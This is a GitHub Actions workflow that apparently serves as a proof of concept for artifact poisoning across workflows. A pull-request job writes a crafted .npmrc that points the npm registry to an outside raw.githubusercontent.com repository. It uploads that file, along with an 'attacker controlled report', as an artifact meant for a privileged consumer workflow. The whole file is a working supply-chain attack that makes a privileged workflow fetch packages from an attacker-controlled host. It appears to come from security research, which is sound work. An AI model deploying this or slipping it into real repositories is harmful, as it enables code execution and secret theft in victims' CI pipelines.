name: Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: attacker controlled artifact for the privileged consumer
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p out
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg6/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf '### attacker controlled report\n' > out/linter-report.txt
          echo "$PR_NUMBER" > out/pr-number.txt
          ls -la out
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: error
